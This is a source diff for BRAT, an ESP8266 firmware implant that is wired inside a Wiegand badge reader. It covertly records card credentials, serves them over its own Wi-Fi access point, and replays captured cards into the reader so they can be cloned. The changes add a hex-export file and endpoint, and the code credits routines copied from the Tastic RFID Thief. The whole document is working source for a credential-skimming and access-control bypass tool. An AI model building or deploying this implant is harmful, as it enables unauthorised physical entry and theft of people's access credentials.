@@ -2,24 +2,37 @@
  * BRAT.ino - Badge Reader Active Tap - is designed to
  *                connect to the Data0 & Data1 lines inside of a Wiegand
  *                based card reader.  It will store the card data on the 
- *                file system of an ESP8266-12.  the device also sets up
- *                an Access point that once connected to, also presents
- *                a web page.  this web page shows card data info, and allows
+ *                file system of an ESP8266-12.  The device sets up
+ *                an Access Point that once connected to, presents
+ *                a web page.  This web page shows card data info, and allows
  *                replay directly into the card reader.  A proxmark device
  *                can be used to program the card data onto a new card.
+ *                The web server also provides a page of Hex vaules used
+ *                by the BRAT RPi app. 
  *                
  * When I orginally set out to bypass the HID Prox devices, I did a lot of research        
- * I came along the Tastic RFID Reader by Bishop Fox, as well as a Def Con Talk barse Lares.
- * After building a Tastic Reader I got the idea that I could some how wirelessly send the
- * card data to 
- *          
+ * I came along the Tastic RFID Reader by Bishop Fox, 
+ * https://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/
+ * as well as a Def Con Talk barse Lares. After building a Tastic Reader I got the 
+ * idea that I could some how wirelessly send the card data to someon that could 
+ * then wirte a card for immediate use.
+ * 
+ * The portions of this code that read the signal from the line 
+ * and decode the bits into FC and Card Num are the same
+ * as what was coded in the Tastic thief.
+ * 
+ * The follwoing code is orginal to the BRAT
+ *   - AP configuration
+ *   - Web Server
+ *   - Writing to another pair of pins are all orgiinal
+ *   - the Trace logic for debugging
+ *             
  * Created by osok
- * github https://github.com/osok/CRAP-Tap
+ * github https://github.com/osok/BRAT
  */
 
 
 #include "Config.h"
-#include "LocalTypes.h"
 #include <string.h>
 #include <ESP8266WiFi.h>
 #include <WiFiClient.h> 
@@ -36,6 +49,7 @@ ESP8266WebServer server(80);
 
 
 char* dataFile = "cards.htm"; // file to save card ids to
+char* hexFile = "card-hex.htm"; // only the card hex is written to this file, one per line
 
 unsigned char databits[MAX_BITS];    // stores all of the data bits
 volatile unsigned int bitCount = 0;
@@ -89,6 +103,7 @@ boolean isWriting = false;
 // Process interrupts
 
 // interrupt that happens when INTO goes low (0 bit)
+//[Copied from the Tastic RFID Thief]
 void ISR_INT0()
 {
  if(!isWriting){
@@ -110,6 +125,7 @@ void ISR_INT0()
 }
 
 // interrupt that happens when INT1 goes low (1 bit)
+//[Copied from the Tastic RFID Thief]
 void ISR_INT1()
 {
   if(!isWriting){
@@ -169,9 +185,14 @@ bool handleFileRead(String path){
 void handleCard() {
   handleFileRead(dataFile);
 }
+void handleCardHex() {
+  handleFileRead(hexFile);
+}
+
 
 void handleClear() {
   SPIFFS.remove(dataFile);
+  SPIFFS.remove(hexFile);
   server.send(200, "text/html", "<html><body>All Clear</body></html>");
 }
 
@@ -255,6 +276,7 @@ void setup() {
   server.on("/clear", handleClear);
   server.on("/view", handleView);
   server.on("/card", handleCard);
+  server.on("/hex", handleCardHex);
   server.on("/access", handleAccess);
   server.begin();
   Serial.println("server started");
@@ -326,14 +348,14 @@ void printBits(){
   }
 
   ///////////////////////////////////////////////////////
-// SETUP function
+// SETUP function  [Copied from the Tastic RFID Thief]
 void getCardNumAndSiteCode()
 {
      unsigned char i;
   
     // we will decode the bits differently depending on how many bits we have
     // see www.pagemac.com/azure/data_formats.php for more info
-    // also specifically: www.brivo.com/app/static_data/js/calculate.js
+    // also specifically: https://www.brivo.com/support/card-calculator
     switch (bitCount) {
 
       
@@ -416,6 +438,7 @@ void getCardNumAndSiteCode()
 //////////////////////////////////////
 // Function to append the card value (bitHolder1 and bitHolder2) to the necessary array then tranlate that to
 // the two chunks for the card value that will be output
+// [Copied from the Tastic RFID Thief]
 void getCardValues() {
   switch (bitCount) {
     case 26:
@@ -823,9 +846,18 @@ void printTimes(){
 
 void writeDataToFS(){
   
+    File fileHex = SPIFFS.open(hexFile, "a");
+    if(bitCount > 20){
+      fileHex.print(cardChunk1, HEX);  
+      fileHex.print(cardChunk2, HEX);  
+      fileHex.print("\r\n");
+    }
+    fileHex.close();
+    
     // open the file. note that only one file can be open at a time,
     // so you have to close this one before opening another.
     File file = SPIFFS.open(dataFile, "a");
+        
     if(bitCount > 20){
       file.print("<a href=\"/access?byte1=");
       file.print(bitHolder1);  
